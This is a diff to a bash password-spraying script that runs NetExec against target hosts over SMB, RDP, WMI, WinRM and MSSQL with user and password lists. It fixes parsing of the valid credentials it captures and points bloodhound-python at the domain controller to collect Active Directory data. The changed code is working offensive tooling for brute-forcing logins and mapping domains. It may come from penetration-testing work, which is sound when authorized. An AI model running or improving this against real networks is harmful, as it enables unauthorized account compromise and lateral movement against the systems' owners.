@@ -32,7 +32,7 @@ mkdir -p "$OUTDIR" "$SPIDER_DIR"
 : > "$USER_EXPORT_OUT"
 
 echo -e "${PURPLE}====================================================${NC}"
-echo -e "${GREEN}[+] Fixed Engine v11 - No More Missing Creds & Errors${NC}"
+echo -e "${GREEN}[+] Spray Engine${NC}"
 echo -e "${PURPLE}====================================================${NC}"
 
 for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
@@ -176,7 +176,7 @@ for ip in "${!PROTO_MAP[@]}"; do
         if [[ ! -s "$TMP_SUCCESS" && "$DOMAIN" != "." && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
             echo -e "${PURPLE}[EXEC] Local auth missed or finished. Trying Domain Spray on $ip ($proto)...${NC}"
             attempt_dom=1
-            EXTRA="" # <--- SEKARANG: Dikosongkan agar tidak bocor ke modul berikutnya
+            EXTRA="" 
             
             while [ $attempt_dom -le $max_spray ]; do
                 echo -e "${GRAY}[CMD] (Attempt $attempt_dom/$max_spray) nxc $proto $ip -u $USER_FILE -p $PASS_FILE -d $DOMAIN --continue-on-success --no-progress${NC}"
@@ -232,9 +232,9 @@ for ip in "${!PROTO_MAP[@]}"; do
                 [[ -z "$line" ]] && continue
                 
                 RAW_CRED=$(echo "$line" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
-                u_p="${RAW_CRED#*\\}"  
-                u="${u_p%%:*}"         
-                p="${u_p#*:}"          
+                u_p="${RAW_CRED#*\\}"      
+                u="${u_p%%:*}"
+                p="${u_p#"$u":}"        
 
                 if [[ -n "$u" && -n "$p" ]]; then
                     echo -e "${GREEN}[!] Valid Credentials Found -> $u:$p${NC}"
@@ -362,7 +362,7 @@ for ip in "${!PROTO_MAP[@]}"; do
                     (
                         cd "$BH_DIR" || exit
                         # Menggunakan tee agar output muncul di terminal SEKALIGUS ditulis ke log
-                        timeout 150s bloodhound-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$ip" -c all 2>&1 | tee bloodhound_run.log
+                        timeout 150s bloodhound-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all 2>&1 | tee bloodhound_run.log
                     )
                     if ls "$BH_DIR"/*.json >/dev/null 2>&1; then
                         echo -e "${GREEN}[+] BloodHound ingestion completed successfully!${NC}" # <--- Biar ada konfirmasi instan di layar
@@ -400,7 +400,6 @@ if [[ -s "$USER_EXPORT_OUT" ]]; then
     # Menghitung jumlah user unik yang berhasil didapatkan
     TOTAL_USERS=$(wc -l < "$USER_EXPORT_OUT")
     
-    echo -e "\n${GREEN}[+++] ALL PROCESSES COMPLETED SUCCESSFULLY!${NC}"
     echo -e "${GREEN}[+] Consolidated $TOTAL_USERS unique users from SMB/LDAP into:${NC}"
     echo -e "${YELLOW}---> $USER_EXPORT_OUT${NC}\n"
 else
